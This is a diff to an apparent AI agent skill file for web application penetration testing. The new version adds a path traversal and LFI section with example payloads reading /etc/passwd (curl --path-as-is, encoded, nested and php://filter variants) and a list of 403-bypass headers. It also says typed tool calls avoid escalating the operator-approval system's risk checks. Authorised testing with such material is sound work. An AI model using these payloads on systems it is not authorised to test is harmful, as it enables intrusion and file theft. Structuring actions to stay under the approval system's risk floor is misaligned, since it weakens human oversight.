@@ -1,7 +1,7 @@
 schema_version: 1
-version: 2.1.0
+version: 3.0.0
 name: web
-description: Senior web application penetration testing — fingerprinting, crawler-based endpoint extraction, directory/parameter fuzzing, and WAF triage.
+description: Senior web application penetration testing — fingerprinting, directory/parameter fuzzing, path traversal/LFI exploitation, 403 bypasses, and WAF triage.
 triggers:
   - web
   - http
@@ -20,6 +20,11 @@ triggers:
   - gobuster
   - whatweb
   - wafw00f
+  - lfi
+  - path traversal
+  - traversal
+  - directory traversal
+  - local file inclusion
 tools:
   - whatweb
   - wafw00f
@@ -30,56 +35,54 @@ tools:
   - nikto
   - gau
 knowledge: |
-  Assess web application attack surfaces systematically like a senior red-team operator.
+  Assess web application attack surfaces systematically like a senior red-team operator with deep protocol awareness.
 
-  TOOLING: prefer each tool's own dedicated function over a raw shell command
-  — `whatweb_scan`, `wafw00f_scan`, `curl_probe`, `katana_crawl`, `gau_fetch`,
-  `ffuf_fuzz`, `nikto_scan` (the last three are also reachable via
-  `run_pentest_tool` if not offered directly). Each already runs with this
-  methodology's proven flags baked in, returns clean parsed text instead of a
-  shell pipeline's raw output, and — as ONE tool call instead of a multi-
-  command shell chain — doesn't trip the operator-approval system's chained-
-  command risk floor the way `cmd1 && cmd2 | cmd3` does. Give a tool an
-  `output_file` set to an ABSOLUTE path under `/home/pentester/work/<target>/`
-  whenever its result feeds a later step (a crawl result you'll grep for
-  `.js` URLs, a fuzz result you'll cross-reference) — sandbox-mcp's own
-  working directory is fixed, so a path relative to wherever a separate shell
-  command `cd`s into will NOT resolve.
+  TOOLING & SANDBOX DISCIPLINE:
+  - Prefer typed MCP functions (`whatweb_scan`, `wafw00f_scan`, `curl_probe`, `katana_crawl`, `ffuf_fuzz`, `nikto_scan`) for standard tasks to avoid shell escaping issues and risk-floor escalations.
+  - When specialized flags (such as `curl --path-as-is`) are required, run targeted single shell commands.
+  - Save multi-step results to absolute paths under `/workspace` or `/home/pentester/work/<target>/`.
 
   1. FINGERPRINTING & WAF TRIAGE:
-     - Identify web server, application framework, CMS, and technologies:
-       `whatweb_scan(url, aggression=3)`.
-     - Check for Web Application Firewalls (Cloudflare, AWS WAF, Akamai, Imperva):
-       `wafw00f_scan(url)`.
-     - Inspect security headers (CSP, HSTS, CORS `Origin: null`, Cookie flags
-       `HttpOnly; Secure; SameSite`):
-       `curl_probe(url, headers_only=true, follow_redirects=true)`.
+     - Technology and CMS identification: `whatweb_scan(url, aggression=3)` or `whatweb -a 3 <url>`.
+     - Web Application Firewall detection: `wafw00f_scan(url)` (identifies Cloudflare, ModSecurity, AWS WAF, etc.).
+     - Security headers and server signature: `curl -s -I <url>`.
 
-  2. MODERN ENDPOINT CRAWLING & JAVASCRIPT DISCOVERY:
-     - Crawl pages, parse client-side forms, and extract endpoints from
-       loaded JS: `katana_crawl(url, depth=3, output_file)`.
-     - Harvest historical endpoints and parameter names:
-       `gau_fetch(domain, output_file)` — take the first ~200 lines of the
-       saved file if the full result is large; that's a raw-shell `head`, not
-       a reason to re-fetch.
+  2. PATH TRAVERSAL & LFI EXPLOITATION (`curl --path-as-is` CRITICAL RULE):
+     - RFC 3986 section 5.2.4 mandates client-side dot-segment normalisation. Standard `curl` resolves `/foo/../bar` to `/bar` before transmission.
+     - MANDATORY: Always pass `--path-as-is` in `curl` when probing directory traversal, LFI, or nested dot-dot sequences. Without this flag, `curl` strips `../` and the server never sees the traversal payload.
+       Example: `curl -s --path-as-is "http://<target>/image?file=../../../../etc/passwd"`
+     - Systematic Traversal Payload Hierarchy:
+       • Standard Traversal: `../../../../etc/passwd` (with `--path-as-is`)
+       • Nested Bypass (against non-recursive string stripping): `....//....//....//etc/passwd`
+       • Single URL-encoded: `..%2f..%2f..%2fetc%2fpasswd`
+       • Double URL-encoded (against WAF / double-decoding proxies): `%252e%252e%252f%252e%252e%252fetc%252fpasswd`
+       • Reverse-Proxy / Tomcat / Spring Semicolon Bypass: `/admin/..;/login` or `/static..;/admin`
+       • PHP Source Disclosure: `php://filter/convert.base64-encode/resource=<filename>`
+       • Null-Byte Termination (legacy PHP < 5.3.4): `/etc/passwd%00`
 
-  3. CONTENT & HIDDEN DIRECTORY DISCOVERY:
-     - Fuzz directories and file extensions with status code filtering:
-       `ffuf_fuzz(url, wordlist="common.txt", match_codes="200,204,301,302,307,401,403", output_file)`
-       or shell using pre-exported wordlists: `ffuf -u <url>/FUZZ -w $COMMON_TXT -mc 200,204,301,302,307,401,403`
-       (or `$MEDIUM_TXT` / `$BIG_TXT` for deeper sweeps).
-     - For identified 403 Forbidden endpoints, test standard bypass headers:
-       `curl_probe(url="<url>/admin", headers=["X-Forwarded-For: 127.0.0.1", "X-Custom-IP-Authorization: 127.0.0.1"])`.
+  3. CONTENT & HIDDEN DIRECTORY DISCOVERY (`ffuf`):
+     - Calibration Discipline: Always check baseline response length (`curl -s -I <url>/random_404_probe`) to avoid false-positive wildcard floods.
+     - Filter out wildcard / soft-404 responses using `-fs <size>`, `-fw <words>`, or `-fc 404`.
+     - Fast directory discovery:
+       `ffuf -u <url>/FUZZ -w $COMMON_TXT -mc 200,204,301,302,307,401,403`
+     - Extension probing: `-e .php,.txt,.html,.bak,.json,.env`
+     - Deeper enumeration: use `$MEDIUM_TXT` once initial routes are mapped.
 
-  4. API & CONFIGURATION EXPOSURE PROBING:
-     - Check common API documentation paths: `/api/v1`, `/swagger.json`, `/api-docs`, `/openapi.json`, `/graphql`.
-     - Check critical exposed files: `/.git/HEAD`, `/.env`, `/.DS_Store`, `/robots.txt`, `/sitemap.xml`.
+  4. 403 FORBIDDEN & REVERSE-PROXY BYPASSES:
+     - For identified 403 Forbidden administrative routes, probe header-based identity overrides:
+       • Client IP spoofing: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`
+       • Rewrite overrides: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`
+       • Host header overrides: `Host: localhost`, `Host: 127.0.0.1`
+     - Test HTTP method tampering: replace `GET` with `POST`, `PUT`, `HEAD`, or `TRACE`.
 
-  5. STRUCTURED EVIDENCE & FINDINGS:
-     - Never report generic descriptions. Include exact HTTP status codes, server response headers,
-       parameter names, or matched URL paths as verifiable evidence.
+  5. MODERN ENDPOINT CRAWLING & JAVASCRIPT DISCOVERY:
+     - Crawl pages and extract hidden endpoints from client-side JavaScript: `katana_crawl(url, depth=3, output_file)`.
+     - Check critical exposed files directly: `/.git/HEAD`, `/.env`, `/.DS_Store`, `/robots.txt`, `/sitemap.xml`.
+
+  6. STRUCTURED EVIDENCE & FINDINGS:
+     - Record exact HTTP status codes, matched URLs, parameter names, and extracted proof (e.g. root user entry from `/etc/passwd`) as verifiable evidence.
 references:
-  - persona:web-v2
+  - persona:web-v3
 provenance:
   origin: builtin
   source: persona/v0.1/skills/web.yaml
